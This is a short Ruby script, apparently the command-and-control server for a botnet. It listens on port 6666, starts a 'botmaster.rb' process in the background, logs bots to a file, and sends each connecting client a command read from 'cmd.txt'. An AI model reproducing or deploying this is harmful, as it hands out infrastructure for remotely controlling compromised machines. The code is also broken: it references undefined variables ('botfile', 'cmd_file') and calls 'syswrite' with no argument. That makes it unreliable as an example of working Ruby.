require 'socket'

server = TCPServer.new("0.0.0.0", 6666)  # Change this to the port you have the client connecting to

# Always override previous file
cmdf = File.new("cmd.txt", 'w')
cmdf.puts("NONE")
cmdf.close
system('ruby botmaster.rb &')

bot_file = File.new("bots.txt", 'a+')

loop do

  # Wait until client connects
  socket = server.accept
  botfile.syswrite

  request = socket.gets

  STDERR.puts request

  cmd_file_read = File.new("cmd.txt", 'r')
  response = cmd_file_read.read
  socket.print response
  cmd_file.close

end
